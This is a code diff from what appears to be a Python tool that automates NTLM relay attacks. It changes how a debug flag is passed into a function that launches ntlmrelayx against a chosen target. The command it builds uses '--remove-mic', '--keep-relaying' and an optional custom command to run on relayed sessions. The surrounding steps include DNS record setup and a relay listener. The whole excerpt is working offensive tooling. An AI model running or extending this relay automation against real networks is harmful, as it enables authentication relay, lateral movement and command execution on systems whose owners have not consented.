@@ -787,7 +787,7 @@ def wait_for_dns_record(record, dns_ip, timeout=60):
 # Step 3: ntlmrelayx listener
 # ═══════════════════════════════════════════════
 def start_ntlmrelayx(target, custom_command=None, socks=False, smb_signing=False,
-                      dc_ip=None, dc_fqdn=None, dns_ip=None):
+                      dc_ip=None, dc_fqdn=None, dns_ip=None, relay_debug=False):
     log_step(3, "START NTLMRELAYX LISTENER")
 
     # On Windows, handle port 445 conflict
@@ -834,7 +834,7 @@ def start_ntlmrelayx(target, custom_command=None, socks=False, smb_signing=False
             "--no-multirelay", "-i", "-smb2support",
             "--remove-mic", "--keep-relaying"
         ]
-        if args.relay_debug:
+        if relay_debug:
             cmd.append("-debug")
             log("RELAY", "..", "NTLM debug output enabled (-debug)")
     else:
@@ -878,7 +878,7 @@ def start_ntlmrelayx(target, custom_command=None, socks=False, smb_signing=False
         log("SMB", "ok", f"Using relay binary: {relay_bin}")
 
         cmd = [relay_bin, "-t", target, "-smb2support"]
-        if args.relay_debug:
+        if relay_debug:
             cmd.append("-debug")
             log("RELAY", "..", "NTLM debug output enabled (-debug)")
         if custom_command:
@@ -1208,7 +1208,7 @@ def main():
 
     ntlmrelay_proc, relay_monitor = start_ntlmrelayx(
         args.relay_target, args.custom_command, args.socks, args.smb_signing_is_on,
-        args.dc_ip, args.dc_fqdn, args.dns_ip
+        args.dc_ip, args.dc_fqdn, args.dns_ip, args.relay_debug
     )
     time.sleep(5)
 
